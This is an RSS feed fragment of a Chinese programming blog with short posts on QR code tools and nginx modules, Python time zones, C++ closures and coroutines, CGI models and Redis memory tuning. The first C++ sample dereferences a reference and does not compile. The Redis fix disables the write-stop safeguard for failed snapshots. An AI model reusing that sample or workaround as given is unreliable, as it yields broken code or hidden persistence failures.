<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">二维码开发库</h2>
<div class="outline-text-2" id="text-2">
<dl class="org-dl">
<dt> <a href="https://github.com/fukuchi/libqrencode">libqrencode</a> </dt><dd>     基础的c语言二维码编码库，很多语言基于它开发扩展，不包含生成png图的功能，如需生成png可参考<a href="https://github.com/bitly/simplehttp/blob/master/qrencode/qrencode.c">这里</a>
</dd>
<dt> <a href="https://github.com/jeromeetienne/jquery-qrcode">jquery-qrcode</a> </dt><dd>     使用javascript直接在客户端生成二维码，中文支持参见<a href="http://suflow.iteye.com/blog/1687396">JS生成二维码，支持中文字符</a>
</dd>
<dt> <a href="http://people.freebsd.org/~vanilla/qrencode-0.3.tar.bz2">php's qrencode extension</a> </dt><dd>     使用nginx的扩展性能会更好一点，参考后面<a href="#sec-4">nginx的相关扩展</a>.
</dd>
<dt> <a href="http://trac.koka-in.org/libdecodeqr">libdecodeqr</a> </dt><dd>     二维码解码库
</dd>
</dl>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">二维码生成工具</h2>
<div class="outline-text-2" id="text-3">
<dl class="org-dl">
<dt> <a href="https://launchpad.net/qr-code-creator/">qr-code-creator</a> </dt><dd>     linux下的GUI程序。
</dd>

<dt> <a href="https://npmjs.org/package/qrcode-terminal">qrcode-terminal</a> </dt><dd>     linux终端下生成并展示二维码，是一个node.js模块，带命令行工具程序，方便使用，介绍文章：<a href="http://blog.michaelbrooks.ca/qrcode-terminal/">QR Code Terminal</a>
</dd>

<dt> <a href="https://github.com/lincolnloop/python-qrcode">python-qrcode</a> </dt><dd>     linux终端下生成并展示二维码，是一个python包，带命令行工具程序，方便使用。
</dd>
</dl>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">nginx的相关扩展</h2>
<div class="outline-text-2" id="text-4">
</div><div id="outline-container-sec-4-1" class="outline-3">
<h3 id="sec-4-1">基本的二维码</h3>
<div class="outline-text-3" id="text-4-1">
<p>
<a href="https://github.com/dcshi/ngx_http_qrcode_module">ngx_http_qrcode_module</a>
</p>
</div>
</div>

<div id="outline-container-sec-4-2" class="outline-3">
<h3 id="sec-4-2">二维码个性化水印</h3>
<div class="outline-text-3" id="text-4-2">
<p>
nginx_http_image_filter加上 <a href="http://forum.nginx.org/read.php?21,235958">水印补丁</a> 即可。
</p>

<p>
下面的是经过修改后的 <code>nginx image filter</code> 模块代码，加入居中的水印效果:
</p>

<p>
<a href="../static/ngx_http_image_filter_module.c">ngx_http_image_filter_module.c</a>
</p>
</div>
</div>

<div id="outline-container-sec-4-3" class="outline-3">
<h3 id="sec-4-3">编译</h3>
<div class="outline-text-3" id="text-4-3">
<div class="org-src-container">

<pre class="src src-sh">--with-debug --with-http_image_filter_module --add-module=/home/tangxinfa/Openso<span style="text-decoration: underline;">urce/nginx-1.2.7/../ngx_http_qrcode_module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../ngx_devel_kit/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../set-misc-nginx-module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../echo-nginx-module/</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-4-4" class="outline-3">
<h3 id="sec-4-4">配置</h3>
<div class="outline-text-3" id="text-4-4">
<pre class="example">
location ~ /qr {
    qrcode_fg_color FF0000;
    qrcode_bg_color FFFFFF;    
    qrcode_level 2;
    qrcode_hint 2;
    qrcode_size 120;
    qrcode_margin 2;
    qrcode_version 5;
    set_unescape_uri $txt $arg_txt;
    qrcode_txt $txt;
    qrcode_casesensitive 1; 
    qrcode_gen;  

    image_filter_watermark "/usr/share/pixmaps/gnome-word.png";
    image_filter_watermark_transparency 95; #0-100
    image_filter watermark;
}
</pre>
</div>
</div>

<div id="outline-container-sec-4-5" class="outline-3">
<h3 id="sec-4-5">访问</h3>
<div class="outline-text-3" id="text-4-5">
<pre class="example">
http://localhost:8080/qr?txt=hello
</pre>
<ul class="org-ul">
<li>显示效果：
</li>
</ul>

<div class="figure">
<p><img src="../static/hello_qr.png" alt="hello_qr.png" />
</p>
</div>
</div>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">二维码基础服务的一点思索</h2>
<div class="outline-text-2" id="text-5">
<ul class="org-ul">
<li>必须建立在cdn的基础上
</li>
<li>用户只需按照约定将内容以及定制参数按照直观的方式编码成二维码图片链接即可
</li>
</ul>

<p>
参考：<a href="https://developers.google.com/chart/infographics/docs/qr_codes">https://developers.google.com/chart/infographics/docs/qr_codes</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下安装cups打印系统]]></title>
            <link>/article/archlinux-4e0b5b8988c5-cups-625353707cfb7edf.html</link>
            <guid>/article/archlinux-4e0b5b8988c5-cups-625353707cfb7edf.html</guid>
            <pubDate>Wed, 27 Mar 2013 13:56:00 GMT</pubDate>
            <content:encoded><![CDATA[<dl class="org-dl">
<dt> 安装 </dt><dd></dd>
</dl>
<div class="org-src-container">

<pre class="src src-sh">yaourt -S cups-pdf
</pre>
</div>

<dl class="org-dl">
<dt> 启动 </dt><dd></dd>
</dl>
<div class="org-src-container">

<pre class="src src-sh">sudo systemctl start cups
</pre>
</div>

<dl class="org-dl">
<dt> 配置 </dt><dd>    参考：<a href="https://wiki.archlinux.org/index.php/Cups#PDF_virtual_printer">https://wiki.archlinux.org/index.php/Cups#PDF_virtual_printer</a>

<p>
登录的用户名要为root，否则后面还是无法添加打印机，web界面没有退出登录的选项，可以试试重启cups服务浏览器清除缓存的数据。</p>
</dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[python中的UTC与本地时区处理]]></title>
            <link>/article/python-4e2d7684-utc-4e0e672c573065f6533a59047406.html</link>
            <guid>/article/python-4e2d7684-utc-4e0e672c573065f6533a59047406.html</guid>
            <pubDate>Wed, 20 Mar 2013 09:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在通过sqlalchemy使用sqlite3数据库的过程中，发现日期时间字段默认值为CURRENT_TIMESTAMP，但是查出的值少了8个小时。很明显是遇到时区问题了。
</p>

<p>
mysql的TIMESTAMP字段类型和sqlite3一样使用UTC时间保存，因为在存取时自动进行了本地时间与UTC时间互转，所以不会遇到时区问题。但是sqlite3没有自动进行这一转换，需要在sql中自行转换:
</p>
<div class="org-src-container">

<pre class="src src-sql"><span style="color: #b5bd68;">select</span> datetime(<span style="color: #b294bb;">CURRENT_TIMESTAMP</span>, <span style="color: #8abeb7;">'localtime'</span>)
</pre>
</div>

<p>
进一步google后，找到了这篇文章：《<a href="http://lucumr.pocoo.org/2011/7/15/eppur-si-muove/">Dealing with Timezones in Python</a>》，文章大意是python中的datetime库默认不携带时区信息，而加上时区后又与不带时区的datetime对象无法一起工作（如：比较），另外像datetime.datetime.utcnow()返回的utc时间和datetime.datetime.now()返回的本地时间也是不携带时区信息的（tzinfo属性为None），容易引起混淆，因此处理的简单性，内部最好统一使用UTC标准时间，和用户交互时再转换为本地时间。
</p>

<p>
下面是互转的算法：
</p>
<div class="org-src-container">

<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">/usr/bin/env python</span>

<span style="color: #b5bd68;">import</span> datetime
<span style="color: #b5bd68;">import</span> time
<span style="color: #b5bd68;">import</span> sys

<span style="color: #b5bd68;">if</span> sys.version &gt;= <span style="color: #8abeb7;">'3.2.'</span>:
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">localtimezone</span> = datetime.timezone(datetime.timedelta(seconds=-time.timezone)<span style="text-decoration: underline;">, time.tzname[0])</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">utctimezone</span> = datetime.timezone.utc
<span style="color: #b5bd68;">else</span>:
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">from</span> dateutil <span style="color: #b5bd68;">import</span> tz
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">localtimezone</span> = tz.tzlocal()
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">utctimezone</span> = tz.gettz(<span style="color: #8abeb7;">'UTC'</span>)

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">parsedatetime</span>(dt, fmt=<span style="color: #8abeb7;">"%Y-%m-%d %H:%M:%S"</span>):
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"""parse local datetime string as utc datetime object"""</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> datetime.datetime.strptime(dt, fmt).replace(tzinfo=localtimezone).ast<span style="text-decoration: underline;">imezone(utctimezone)</span>

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">formatdatetime</span>(dt, fmt=<span style="color: #8abeb7;">"%Y-%m-%d %H:%M:%S"</span>):
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"""format utc datetime object as local datetime string"""</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> dt.replace(tzinfo=utctimezone).astimezone(localtimezone).strftime(fmt<span style="text-decoration: underline;">)</span>

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">'__main__'</span>:
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">input_local_datetime</span> = <span style="color: #8abeb7;">'2012-01-02 03:04:05'</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">parsed_utc_datetime</span> = parsedatetime(input_local_datetime)
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">assert</span>(formatdatetime(parsed_utc_datetime) == input_local_datetime)
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[C++的函数、闭包与协程]]></title>
            <link>/article/c-768451fd6570300195ed53054e0e534f7a0b.html</link>
            <guid>/article/c-768451fd6570300195ed53054e0e534f7a0b.html</guid>
            <pubDate>Fri, 15 Mar 2013 02:04:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">实现序号生成器</h2>
<div class="outline-text-2" id="text-1">
</div><div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1">函数（Function）</h3>
<div class="outline-text-3" id="text-1-1">
<div class="org-src-container">

<pre class="src src-c++"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;cassert&gt;</span>

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">id_generator</span>(<span style="color: #81a2be;">int</span>&amp; <span style="color: #f0c674;">base</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">step</span>)
{
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">result</span> = *base;
<span style="background-color: #373b41;"> </span>   *base += step;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> result;
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">odd_base</span> = 1;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">even_base</span> = 0;<span style="color: #cc6666; background-color: #373b41;">    </span>
<span style="background-color: #373b41;"> </span>   assert(id_generator(odd_base, 2) == 1);
<span style="background-color: #373b41;"> </span>   assert(id_generator(odd_base, 2) == 3);
<span style="background-color: #373b41;"> </span>   assert(id_generator(odd_base, 2) == 5);
<span style="background-color: #373b41;"> </span>   assert(id_generator(even_base, 2) == 0);
<span style="background-color: #373b41;"> </span>   assert(id_generator(even_base, 2) == 2);
<span style="background-color: #373b41;"> </span>   assert(id_generator(even_base, 2) == 4);<span style="color: #cc6666; background-color: #373b41;">        </span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<dl class="org-dl">
<dt> 编译 </dt><dd><pre class="example">
g++ -g add.cpp -o add
</pre>
</dd>
</dl>
</div>
</div>

<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2">闭包（Closure）</h3>
<div class="outline-text-3" id="text-1-2">
<div class="org-src-container">

<pre class="src src-c++"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;cassert&gt;</span>

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">base</span> = 1;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">auto</span> <span style="color: #81a2be;">id_generator_odd</span> = [=]() <span style="color: #b5bd68;">mutable</span> { <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">result</span> = base; base += 2; <span style="color: #b5bd68;">return</span><span style="text-decoration: underline;"> result; };</span>
<span style="background-color: #373b41;"> </span>   base = 0;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">auto</span> <span style="color: #81a2be;">id_generator_even</span> = [=]() <span style="color: #b5bd68;">mutable</span> { <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">result</span> = base; base += 2; <span style="color: #b5bd68;">retur</span><span style="color: #b5bd68; text-decoration: underline;">n</span><span style="text-decoration: underline;"> result; };</span>
<span style="background-color: #373b41;"> </span>   assert(id_generator_odd() == 1);
<span style="background-color: #373b41;"> </span>   assert(id_generator_odd() == 3);
<span style="background-color: #373b41;"> </span>   assert(id_generator_odd() == 5);
<span style="background-color: #373b41;"> </span>   assert(id_generator_even() == 0);
<span style="background-color: #373b41;"> </span>   assert(id_generator_even() == 2);
<span style="background-color: #373b41;"> </span>   assert(id_generator_even() == 4);
<span style="background-color: #373b41;"> </span>   assert(base == 0);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<dl class="org-dl">
<dt> 编译 </dt><dd><pre class="example">
g++ -g closure.cpp -o closure -std=c++0x
</pre>
</dd>
</dl>
</div>
</div>

<div id="outline-container-sec-1-3" class="outline-3">
<h3 id="sec-1-3">协程（Coroutine）</h3>
<div class="outline-text-3" id="text-1-3">
<div class="org-src-container">

<pre class="src src-c++"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;boost/bind.hpp&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;boost/coroutine/all.hpp&gt;</span>

<span style="color: #b5bd68;">typedef</span> <span style="color: #81a2be;">boost</span>::<span style="color: #81a2be;">coroutines</span>::<span style="color: #81a2be;">coroutine</span>&lt; <span style="color: #81a2be;">int</span>(<span style="color: #81a2be;">void</span>) &gt; <span style="color: #81a2be;">IDGenerator</span>;

<span style="color: #81a2be;">void</span> <span style="color: #de935f;">idGenerator</span>(<span style="color: #81a2be;">IDGenerator</span>::<span style="color: #81a2be;">caller_type</span>&amp; <span style="color: #f0c674;">ca</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">base</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">step</span>)
{
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">do</span>{
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ca(base);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   base += step;
<span style="background-color: #373b41;"> </span>   }<span style="color: #b5bd68;">while</span>(<span style="color: #81a2be;">true</span>);
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">IDGenerator</span> <span style="color: #f0c674;">id_generator_odd</span>(<span style="color: #81a2be;">boost</span>::bind(idGenerator, _1, 1, 2));
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">IDGenerator</span> <span style="color: #f0c674;">id_generator_even</span>(<span style="color: #81a2be;">boost</span>::bind(idGenerator, _1, 0, 2));
<span style="background-color: #373b41;"> </span>   assert(id_generator_odd.get() == 1);
<span style="background-color: #373b41;"> </span>   assert(id_generator_odd().get() == 3);
<span style="background-color: #373b41;"> </span>   assert(id_generator_odd().get() == 5);
<span style="background-color: #373b41;"> </span>   assert(id_generator_even.get() == 0);
<span style="background-color: #373b41;"> </span>   assert(id_generator_even().get() == 2);
<span style="background-color: #373b41;"> </span>   assert(id_generator_even().get() == 4);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<dl class="org-dl">
<dt> 编译 </dt><dd><pre class="example">
g++ -g coroutine.cpp -lboost_context -o coroutine -std=c++0x
</pre>
</dd>
</dl>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">特性比较</h2>
<div class="outline-text-2" id="text-2">
</div><div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1">函数（Function）</h3>
<div class="outline-text-3" id="text-2-1">
<ul class="org-ul">
<li>无状态
</li>
<li>需要独立定义执行体
</li>
<li>调用过程中从头到尾执行体内所有代码
</li>
<li>在输入相同的情况下，能够保证输出也相同
</li>
<li>没有副作用，多线程安全
</li>
<li>要借助外部变量保存状态
</li>
<li>调用比较麻烦，需要传入保存状态的参数
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2-2" class="outline-3">
<h3 id="sec-2-2">闭包（Closure）</h3>
<div class="outline-text-3" id="text-2-2">
<ul class="org-ul">
<li>有状态，内部直接保存
</li>
<li>直接内联定义执行体
</li>
<li>调用过程中从头到尾执行体内所有代码
</li>
<li>输入相同的情况下，输出可能不同
</li>
<li>有副作用，非多线程安全
</li>
<li>定义时可以多种方式安全地引用外部变量
</li>
<li>调用简单，不需要传入保存状态的参数
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2-3" class="outline-3">
<h3 id="sec-2-3">协程（Coroutine）</h3>
<div class="outline-text-3" id="text-2-3">
<ul class="org-ul">
<li>有状态，内部直接保存
</li>
<li>需要独立定义执行体
</li>
<li>调用过程中直接从上次的运行状态继续运行
</li>
<li>输入相同的情况下，输出可能不同
</li>
<li>严禁多线程访问
</li>
<li>调用简单，不需要传入保存状态的参数    
</li>
</ul>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[网页中的自动完成的下拉列表框]]></title>
            <link>/article/7f5198754e2d768481ea52a85b8c621076844e0b62c9521788686846.html</link>
            <guid>/article/7f5198754e2d768481ea52a85b8c621076844e0b62c9521788686846.html</guid>
            <pubDate>Sun, 10 Mar 2013 13:23:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">jqueryui的<a href="http://jqueryui.com/autocomplete/#combobox">组件</a></h2>
<div class="outline-text-2" id="text-1">
<p>
示例效果看起来挻好，不过发现几个问题：
</p>

<ul class="org-ul">
<li>和<a href="http://twitter.github.com/bootstrap/">bootstrap</a>有冲突，导致右边的下拉箭头部分都看不见。
</li>
<li>操作过程中有时候显示的值和实际的值不一致，应该是中文输入法按键事件在firefox下未触发引起的显示的界面部分和隐藏的select输入框值不同步。
</li>
<li>没有提供设置当前选中项、禁用的功能，要自行对生成的界面元素进行处理。
</li>
</ul>

<p>
这个只是jqueryui自动完成输入框的一个定制示例，不是很完善，而jqueryui自带的正式版看起来只是一个输入框。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><a href="https://github.com/harvesthq/chosen">chosen</a></h2>
<div class="outline-text-2" id="text-2">
<p>
非常完美，配置很简单，而且界面很漂亮，在github上评分很高。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下跨进程传递文件描述符]]></title>
            <link>/article/linux-4e0b8de88fdb7a0b4f20901265874ef663cf8ff07b26.html</link>
            <guid>/article/linux-4e0b8de88fdb7a0b4f20901265874ef663cf8ff07b26.html</guid>
            <pubDate>Sat, 09 Mar 2013 07:11:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">问题</h2>
<div class="outline-text-2" id="text-1">
<p>
在web开发中，以典型的php-fpm为例，对于到外部系统的连接（如：mysql、redis）等都提供了持久连接接口（pconnect），但是受限于多进程模型，事实上是每个php-fpm进程都有单独的一个连接池的（参见：《<a href="http:5f53-php-90474e0a-redis.html">当php遇上redis</a>》），大量空闲连接的存在不仅对系统资源造成了浪费（不单指fd空间，像mysql的每连接一线程会附带大量内存空间：sort_buffer、read_buffer等），而且整个系统将无法横向扩展（如：mysql连接数限制）。如果可以在进程间共享文件描述符，将可以大大提升系统性能，促进多进程模型的应用。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">方案</h2>
<div class="outline-text-2" id="text-2">
<p>
在linux平台下，sendmsg、recvmsg可以将一个进程的文件描述符传递给另一进程使用，这使得实现系统级的连接池成为可能。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">实现</h2>
<div class="outline-text-2" id="text-3">
<p>
《The Linux Programming Interface》61.13.3 Passing File Descriptors
</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Web模型初探]]></title>
            <link>/article/web-6a21578b521d63a2.html</link>
            <guid>/article/web-6a21578b521d63a2.html</guid>
            <pubDate>Thu, 28 Feb 2013 07:07:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">CGI</h2>
<div class="outline-text-2" id="text-1">
<p>
全称为Common Gateway Interface，即公共网关接口。
当Web服务器收到一个请求时，运行相应的处理程序，相关参数通过标准输入传递给处理程序，处理程序的标准输出做为响应内容，处理程序运行结束后将响应发送给客户端。
</p>

<ul class="org-ul">
<li>性能 *

<p>
进程级，每请求一进程。进程创建有很大的开销，并发数与系统资源消耗呈线性增长，有限的系统资源成为瓶颈。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">FastCGI</h2>
<div class="outline-text-2" id="text-2">
<p>
为CGI的改良，CGI程序做为独立的网络后台程序运行，当Web服务器收到一个请求时，发起一个tcp请求到处理程序，通过该tcp连接传入相关参数，处理程序的响应也通过该tcp连接发回给Web服务器，处理程序关闭该连接表示处理完毕，Web服务器最终将响应发送给客户端。
</p>

<ul class="org-ul">
<li>性能 **

<p>
网络级，每请求一连接。CGI的改良，重用进程，进程处理完一个请求后再处理下一请求，对于多个请求，只需要付出一次进程创建的开销，可以在后继请求重用资源（从文件载入的配置项、查询到的数据、打开的文件、数据库连接等）。因为处理程序是串行处理请求，往往需要同时运行多个处理程序以提升并发处理能力，这些处理程序无法共享资源以进一步提升性能。
</p>
</li>

<li>附录

<p>
Web服务器可重用到服务程序的连接进一步提升性能（如：nginx的<a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive">upstream_keepalive</a>）。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">WSGI</h2>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">uWSGI</h2>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用hash表结构减少redis内存占用]]></title>
            <link>/article/4f7f7528-hash-88687ed3678451cf5c11-redis-51855b5853607528.html</link>
            <guid>/article/4f7f7528-hash-88687ed3678451cf5c11-redis-51855b5853607528.html</guid>
            <pubDate>Sun, 16 Dec 2012 07:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
当hash结构中的元素较少（少于redis.conf:hash-max-zipmap-entries指定的数量时，配置成&lt;=1000，过大会减低处理速度，参见： <a href="http://stackoverflow.com/questions/11281734/redis-using-hashes">这里</a> 和 <a href="http://instagram-engineering.tumblr.com/post/12202313862/storing-hundreds-of-millions-of-simple-key-value-pairs">这里</a> ）且数据为整型时，redis使用特殊的方式（数组保存，时间换空间）保存hash结构以减少内存占用，参见 <a href="http://redis.io/topics/memory-optimization">这里</a> 和 <a href="http://stackoverflow.com/questions/9625246/what-are-the-underlying-data-structures-used-for-redis">这里</a> 。但当hash结构超过指定数量时将使用普通的<a href="http://redis.io/commands#string">字符串</a>方式保存，也就无法再节省内存了。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决保存快照失败后redis无法写入的问题]]></title>
            <link>/article/89e351b34fdd5b585feb716759318d25540e-redis-65e06cd551995165768495ee9898.html</link>
            <guid>/article/89e351b34fdd5b585feb716759318d25540e-redis-65e06cd551995165768495ee9898.html</guid>
            <pubDate>Sun, 16 Dec 2012 07:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
用命令行工具连上后执行“set test 0”出现以下错误提示：
</p>
<pre class="example">
MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.
</pre>
<p>
这个应该是之前强制停止redis快照导致的，查看redis快照状态证实了这一点：
</p>
<pre class="example">
redis 127.0.0.1:6379&gt; info
...
rdb_last_bgsave_status:err
...
</pre>
<p>
通过关闭配置项stop-writes-on-bgsave-error解决该问题。
</p>
<pre class="example">
redis 127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[估算redis内存占用]]></title>
            <link>/article/4f307b97-redis-51855b5853607528.html</link>
            <guid>/article/4f307b97-redis-51855b5853607528.html</guid>
            <pubDate>Sun, 16 Dec 2012 07:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
参考: <a href="http://lethain.com/notes-on-redis-memory-usage/">Notes on Redis Memory Usage</a>
</p>

<ul class="org-ul">
<li>测试环境
<dl class="org-dl">
<dt> redis版本 </dt><dd>redis_version:2.4.4
</dd>
<dt> 操作系统（uname -a） </dt><dd>Linux CentOS 2.6.32-220.13.1.el6.x86_64 #1 SMP Tue Apr 17 23:56:34 BST 2012 x86_64 x86_64 x86_64 GNU/Linux
</dd>
<dt> python版本（python &#x2013;version） </dt><dd>Python 2.6.6
</dd>
</dl>
</li>
</ul>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">Strings</h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>测试脚本
<div class="org-src-container">

<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/env python</span>

<span style="color: #b5bd68;">import</span> redis
<span style="color: #b5bd68;">import</span> uuid
<span style="color: #b5bd68;">import</span> time

<span style="color: #f0c674;">r</span> = redis.Redis(host=<span style="color: #8abeb7;">'localhost'</span>, port=6379, db=0)
<span style="color: #b5bd68;">for</span> num_strings <span style="color: #b5bd68;">in</span> (100000,):
<span style="background-color: #373b41;"> </span>   r.flushall()
<span style="background-color: #373b41;"> </span>   time.sleep(1.0)
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">initial_size</span> = r.dbsize()
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">initial_info</span> = r.info()

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span> i <span style="color: #b5bd68;">in</span> <span style="color: #b294bb;">xrange</span>(0, num_strings):
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   r.<span style="color: #b294bb;">set</span>(<span style="color: #b294bb;">str</span>(uuid.uuid4()), time.time())
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">r.setex(str(uuid.uuid4()), time.time(), 100000)</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">final_size</span> = r.dbsize()
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">final_info</span> = r.info()

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"For %s strings."</span> % (num_strings,)
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Keys: %s =&gt; %s"</span> % (initial_size, final_size)
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Memory: %s =&gt; %s"</span> % (initial_info[<span style="color: #8abeb7;">'used_memory'</span>],
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   final_info[<span style="color: #8abeb7;">'used_memory'</span>])
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Memory per key: %d"</span>%((<span style="color: #b294bb;">int</span>(final_info[<span style="color: #8abeb7;">'used_memory'</span>]) - <span style="color: #b294bb;">int</span>(initial_in<span style="text-decoration: underline;">fo[</span><span style="color: #8abeb7; text-decoration: underline;">'used_memory'</span><span style="text-decoration: underline;">])) / num_strings)</span>
</pre>
</div>
</li>
<li>测试结果
<dl class="org-dl">
<dt> set </dt><dd>每个key-value占用138字节，可见redis本身的维护开销为89字节
</dd>
<dt> setex </dt><dd>每个key-value占用180字节，可见redis本身的维护开销为131字节，启用过期时间需要42字节开销（这是因为redis使用新的链表保存设置了过期时间的条目）。
